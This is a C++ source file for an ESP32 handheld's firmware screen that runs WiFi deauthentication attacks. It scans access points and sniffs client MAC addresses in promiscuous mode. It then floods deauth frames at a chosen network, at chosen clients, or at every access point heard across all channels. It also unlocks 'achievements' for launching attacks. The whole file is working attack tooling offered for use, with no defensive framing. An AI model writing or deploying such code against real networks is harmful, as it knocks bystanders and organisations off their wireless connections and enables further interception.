#include "WifiDeauthDisassocScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/network/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// ── Static definitions ────────────────────────────────────────────────────

WifiDeauthDisassocScreen::ApEntry WifiDeauthDisassocScreen::_allTargets[MAX_ALL] = {};
int          WifiDeauthDisassocScreen::_allCount = 0;
portMUX_TYPE WifiDeauthDisassocScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;
WifiDeauthDisassocScreen* WifiDeauthDisassocScreen::_clientScanner = nullptr;
portMUX_TYPE WifiDeauthDisassocScreen::_clientLock = portMUX_INITIALIZER_UNLOCKED;

// ── Destructor ────────────────────────────────────────────────────────────

WifiDeauthDisassocScreen::~WifiDeauthDisassocScreen()
{
  if (_clientScanner == this) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    _clientScanner = nullptr;
  }
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────

void WifiDeauthDisassocScreen::onInit()
{
  _state = STATE_MAIN;
  _showMain();
}

void WifiDeauthDisassocScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    _mainSel = index;  // remember where the user was
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      if (index == 2) {
        if (_target.ssid == "-") ShowStatusAction::show("Access Point not set");
        else _scanClients();
      }
      if (index == 3) _startDeauth();
    } else {  // MODE_ALL
      if (index == 1) _startDeauth();
    }
  } else if (_state == STATE_SELECT_WIFI) {
    if (index == 0) {
      _selectWifi(true);
      return;
    }

    const int scanIndex = (int)index - 1;
    if (scanIndex < 0 || scanIndex >= _scanCount) return;

    _target.ssid    = _scanLabels[scanIndex];
    _target.channel = _scanChannels[scanIndex];
    sscanf(_scanValues[scanIndex], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _selectedClientCount = 0;
    _selectedClientMacStr[0] = '\0';
    _showMain();
  } else if (_state == STATE_SELECT_CLIENTS) {
    if (index == 0) {
      _scanClients();
      return;
    }

    if (index == 1) {
      _selectedClientCount = 0;
      _selectedClientMacStr[0] = '\0';
      _showClients(true);
      return;
    }

    const int n = (int)index - 2;
    if (n < 0 || n >= _seenClientCount) return;

    const uint8_t* mac = _seenClients[_clientOrder[n]].mac;

    // Toggle selection (same pattern as Packet Sniffer MAX_MAC = 4)
    int found = -1;
    for (uint8_t i = 0; i < _selectedClientCount; ++i) {
      if (memcmp(_selectedClients[i], mac, 6) == 0) {
        found = (int)i;
        break;
      }
    }
    if (found >= 0) {
      for (uint8_t i = (uint8_t)found; i + 1 < _selectedClientCount; ++i)
        memcpy(_selectedClients[i], _selectedClients[i + 1], 6);
      --_selectedClientCount;
    } else if (_selectedClientCount < MAX_SELECTED_CLIENTS) {
      memcpy(_selectedClients[_selectedClientCount++], mac, 6);
    } else {
      ShowStatusAction::show("Client limit: 4", 1000);
    }
    _refreshSelectedClientMacStr();
    _showClients(true);
  }
}

void WifiDeauthDisassocScreen::onUpdate()
{
  if (_state != STATE_DEAUTHING) {
    ListScreen::onUpdate();
    return;
  }

    if (Uni.Nav->wasPressed()) {
      const auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        _stopDeauth();
        return;
      }
    }

    _spinIdx = (_spinIdx + 1) % 4;

    if (_mode == MODE_ALL) {
      _deauthAll();
      _statusMsg = String("Deauthing ") + _allCount + " APs...";
    } else if (_selectedClientCount == 0) {
      if (_attacker) {
        _attacker->deauthenticate(_target.bssid, _target.channel);
        _statusMsg = String("Deauthing ") + _target.ssid + "...";
      }
    } else if (_attacker) {
      for (uint8_t i = 0; i < _selectedClientCount; ++i)
        _attacker->deauthenticate(_selectedClients[i], _target.bssid, _target.channel);
      if (_selectedClientCount == 1)
        _statusMsg = String("Deauthing ") + _selectedClientMacStr + "...";
      else
        _statusMsg = String("Deauthing ") + _selectedClientCount + " clients...";
    }

    render();

    delay(100);
    
}

void WifiDeauthDisassocScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI || _state == STATE_SELECT_CLIENTS) {
    _showMain();
  } else if (_state == STATE_DEAUTHING) {
    _stopDeauth();
  } else {
    Screen.goBack();
  }
}

// ── Private ───────────────────────────────────────────────────────────────

void WifiDeauthDisassocScreen::onRender()
{
  if (_state == STATE_DEAUTHING) { _drawStatus(_statusMsg.c_str()); return; }
  ListScreen::onRender();
}

void WifiDeauthDisassocScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  const uint8_t itemCount = (_mode == MODE_TARGET) ? 4 : 2;

  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Access Point", _targetSub.c_str()};
    _clientsSub = _selectedClientCount ? "Custom" : "All";
    _mainItems[2] = {"Clients", _clientsSub.c_str()};
    _mainItems[3] = {"Start"};
  } else {
    _mainItems[1] = {"Start"};
  }

  // Clamp in case mode changed and previous index is now invalid
  if (_mainSel >= itemCount) _mainSel = 0;

  // setItems overload that preserves/restores the selected index
  setItems(_mainItems, itemCount, _mainSel);
}

void WifiDeauthDisassocScreen::_showScanResults()
{
  _state = STATE_SELECT_WIFI;
  _scanItems[0] = {"Rescan"};

  for (int i = 0; i < _scanCount; i++) {
    _scanItems[i + 1] = {_scanLabels[i], _scanDisplay[i]};
    _scanItems[i + 1].rssi            = _scanRssi[i];
    _scanItems[i + 1].hasRssi         = true;
    _scanItems[i + 1].sublabelMarquee = true;
  }

  setItems(_scanItems, _scanCount + 1);
}

void WifiDeauthDisassocScreen::_selectWifi(bool forceScan)
{
  if (_scanValid && !forceScan) {
    _showScanResults();
    return;
  }

  _state = STATE_SELECT_WIFI;
  render();
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  WiFi.scanDelete();
  const int total = WiFi.scanNetworks();

  _scanCount = total > MAX_SCAN ? MAX_SCAN : (total > 0 ? total : 0);
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "%s",
             WiFi.SSID(i).c_str());
    _scanChannels[i] = (uint8_t)WiFi.channel(i);
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    snprintf(_scanDisplay[i], sizeof(_scanDisplay[i]), "%s CH%u", _scanValues[i], (unsigned)_scanChannels[i]);
    _scanRssi[i] = (int16_t)WiFi.RSSI(i);
  }

  WiFi.scanDelete();
  _scanValid = true;

  if (_scanCount == 0) {
    ShowStatusAction::show("No networks found");
  }

  _showScanResults();
}

bool WifiDeauthDisassocScreen::_clientSelected(const uint8_t* mac) const {
  for (uint8_t i = 0; i < _selectedClientCount; ++i)
    if (memcmp(_selectedClients[i], mac, 6) == 0) return true;
  return false;
}

void WifiDeauthDisassocScreen::_refreshSelectedClientMacStr()
{
  if (_selectedClientCount == 1) {
    const uint8_t* m = _selectedClients[0];
    snprintf(_selectedClientMacStr, sizeof(_selectedClientMacStr),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
  } else {
    _selectedClientMacStr[0] = '\0';
  }
}

void WifiDeauthDisassocScreen::_clientCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  auto* self = _clientScanner;
  if (!self || !buf || type != WIFI_PKT_DATA) return;
  const auto* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  if (pkt->rx_ctrl.sig_len < 24) return;
  const uint8_t* f = pkt->payload;
  if ((f[0] & 0x0c) != 0x08) return;
  const bool toDs = (f[1] & 1) != 0;
  const bool fromDs = (f[1] & 2) != 0;
  if (toDs == fromDs) return;
  const uint8_t* ap = toDs ? f + 4 : f + 10;
  const uint8_t* station = toDs ? f + 10 : f + 4;
  if (memcmp(ap, self->_target.bssid, 6) != 0 || (station[0] & 1)) return;
  portENTER_CRITICAL(&self->_clientLock);
  for (uint8_t i = 0; i < self->_seenClientCount; ++i) {
    if (memcmp(self->_seenClients[i].mac, station, 6) == 0) {
      self->_seenClients[i].rssi = pkt->rx_ctrl.rssi;
      portEXIT_CRITICAL(&self->_clientLock);
      return;
    }
  }
  if (self->_seenClientCount < MAX_SEEN_CLIENTS) {
    auto& entry = self->_seenClients[self->_seenClientCount++];
    memcpy(entry.mac, station, 6);
    entry.rssi = pkt->rx_ctrl.rssi;
    snprintf(entry.macStr, sizeof(entry.macStr),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             station[0], station[1], station[2],
             station[3], station[4], station[5]);
  }
  portEXIT_CRITICAL(&self->_clientLock);
}

void WifiDeauthDisassocScreen::_scanClients() {
  _state = STATE_SELECT_CLIENTS;
  ShowStatusAction::show("Scanning...", 0);
  _seenClientCount = _selectedClientCount;
  memset(_seenClients, 0, sizeof(_seenClients));
  for (uint8_t i = 0; i < _selectedClientCount; ++i) {
    memcpy(_seenClients[i].mac, _selectedClients[i], 6);
    snprintf(_seenClients[i].macStr, sizeof(_seenClients[i].macStr),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             _selectedClients[i][0], _selectedClients[i][1], _selectedClients[i][2],
             _selectedClients[i][3], _selectedClients[i][4], _selectedClients[i][5]);
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  _clientScanner = this;
  esp_wifi_set_promiscuous_rx_cb(&_clientCb);
  esp_wifi_set_channel(_target.channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  // Match Packet Sniffer discovery time: 2 * 13 * 500 ms = 13 seconds.
  // Remain on the selected AP channel rather than hopping across unrelated channels.
  for (uint8_t pass = 0; pass < 2; ++pass) {
    for (uint8_t interval = 0; interval < 13; ++interval) delay(500);
  }
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  _clientScanner = nullptr;
  delay(10);
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  _showClients();
}

void WifiDeauthDisassocScreen::_showClients(bool preserveSelection) {
  _state = STATE_SELECT_CLIENTS;
  _clientItems[0] = {"Rescan"};
  snprintf(_clientLabels[1], sizeof(_clientLabels[1]), "[%c] All", _selectedClientCount ? ' ' : 'x');
  _clientItems[1] = {_clientLabels[1]};

  // Sort by RSSI (strongest first), same pattern as Packet Sniffer
  for (uint8_t i = 0; i < _seenClientCount; ++i) _clientOrder[i] = i;
  for (uint8_t i = 1; i < _seenClientCount; ++i) {
    uint8_t key = _clientOrder[i], j = i;
    while (j > 0 && _seenClients[_clientOrder[j - 1]].rssi < _seenClients[key].rssi) {
      _clientOrder[j] = _clientOrder[j - 1];
      --j;
    }
    _clientOrder[j] = key;
  }

  for (uint8_t i = 0; i < _seenClientCount; ++i) {
    const auto& entry = _seenClients[_clientOrder[i]];
    snprintf(_clientLabels[i + 2], sizeof(_clientLabels[i + 2]),
             "[%c] %s",
             _clientSelected(entry.mac) ? 'x' : ' ', entry.macStr);
    _clientItems[i + 2] = {_clientLabels[i + 2]};
    _clientItems[i + 2].rssi = entry.rssi;
    _clientItems[i + 2].hasRssi = true;
  }
  if (preserveSelection) { setCount(_seenClientCount + 2); render(); }
  else setItems(_clientItems, _seenClientCount + 2);
}

void WifiDeauthDisassocScreen::_startDeauth()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Access Point not set");
      return;
    }
  }

  _state       = STATE_DEAUTHING;
  _spinIdx     = 0;
  _chromeDrawn = false;

  int nd = Achievement.inc("wifi_deauth_first");
  if (nd == 1)  Achievement.unlock("wifi_deauth_first");
  if (nd == 10) Achievement.unlock("wifi_deauth_10");
  if (_mode == MODE_ALL) {
    int na = Achievement.inc("wifi_deauth_all_mode");
    if (na == 1) Achievement.unlock("wifi_deauth_all_mode");
  }

  _attacker = new WifiAttackUtil();

  if (_mode == MODE_ALL) {
    portENTER_CRITICAL(&_allLock);
    memset(_allTargets, 0, sizeof(_allTargets));
    _allCount = 0;
    portEXIT_CRITICAL(&_allLock);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiDeauthDisassocScreen::_beaconCb);
    _statusMsg = "Scanning...";
  } else {
    _statusMsg = "Deauthing " + _target.ssid + "...";
  }
  render();
}


void WifiDeauthDisassocScreen::_stopDeauth()
{
  if (_mode == MODE_ALL) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
  }
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _spinIdx     = 0;
  _allChanHop  = 0;
  _allCount    = 0;
  ShowStatusAction::show("Stopped", 1000);
  _showMain();
}

void WifiDeauthDisassocScreen::_deauthAll()
{
  if (!_attacker) return;

  // Snapshot under lock so we don't block the beacon callback
  ApEntry local[MAX_ALL];
  int count;
  portENTER_CRITICAL(&_allLock);
  memcpy(local, _allTargets, sizeof(_allTargets));
  count = _allCount;
  portEXIT_CRITICAL(&_allLock);

  // Deauth all known APs (changes channel per AP internally)
  for (int i = 0; i < count; i++) {
    if (!local[i].valid) continue;
    _attacker->deauthenticate(local[i].bssid, local[i].channel);
  }

  // Hop to next scan channel AFTER deauth — dwell here until next call (~100ms)
  // so promiscuous callback can capture beacons on this channel
  _allChanHop = (_allChanHop % 13) + 1;
  _attacker->setChannel(_allChanHop);
}

void WifiDeauthDisassocScreen::_drawStatus(const char* msg)
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    _chromeDrawn = true;
  }

  String displayMsg(msg);
  String titleLine;
  String detailLine;

  // Targeted deauth status reads better with the AP name on its own line.
  // Keep the all-AP counter on one line (e.g. "Deauthing 4 APs...").
  const int deauthPos = displayMsg.indexOf("Deauthing ");
  const bool isAllAps = displayMsg.indexOf(" APs") >= 0;
  if (deauthPos >= 0 && !isAllAps) {
    const int detailPos = deauthPos + 10;  // strlen("Deauthing ")
    titleLine  = displayMsg.substring(0, detailPos - 1);
    detailLine = displayMsg.substring(detailPos);
    // keep the trailing "..." so the user sees the ongoing operation
  }

  const int lineH = lcd.fontHeight();
  const bool twoLines = !detailLine.isEmpty();
  const int labelH = twoLines ? (lineH * 2 + 6) : (lineH + 4);
  const int cy = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  if (!sp.createSprite(bodyW(), labelH)) return;
  sp.fillSprite(TFT_BLACK);
  sp.setTextSize(1);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);

  const int maxTextW = bodyW() - 8;
  auto fitLine = [&](String& text) {
    if (sp.textWidth(text.c_str()) <= maxTextW) return;
    while (text.length() > 1 &&
           sp.textWidth((text + "...").c_str()) > maxTextW) {
      text.remove(text.length() - 1);
    }
    text += "...";
  };

  if (twoLines) {
    fitLine(titleLine);
    fitLine(detailLine);
    sp.drawString(titleLine.c_str(), bodyW() / 2, lineH / 2 + 1);
    sp.drawString(detailLine.c_str(), bodyW() / 2, lineH + lineH / 2 + 5);
  } else {
    fitLine(displayMsg);
    sp.drawString(displayMsg.c_str(), bodyW() / 2, labelH / 2);
  }

  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Beacon callback ────────────────────────────────────────────────────────

void WifiDeauthDisassocScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || buf == nullptr) return;

  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const size_t   len = pkt->rx_ctrl.sig_len;

  if (len < 10) return;

  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
  if (fc_sub != 8) return;  // beacon only

  // BSSID is addr3 (offset 16) in beacon management frame
  if (len < 22) return;
  const uint8_t* bssid = pay + 16;
  const uint8_t  ch    = pkt->rx_ctrl.channel;

  portENTER_CRITICAL(&_allLock);

  // Check if already present
  for (int i = 0; i < _allCount; i++) {
    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
      _allTargets[i].channel = ch;  // update channel in case it changed
      portEXIT_CRITICAL(&_allLock);
      return;
    }
  }

  // Add new entry
  if (_allCount < MAX_ALL) {
    memcpy(_allTargets[_allCount].bssid, bssid, 6);
    _allTargets[_allCount].channel = ch;
    _allTargets[_allCount].valid   = true;
    _allCount++;
  }

  portEXIT_CRITICAL(&_allLock);
}
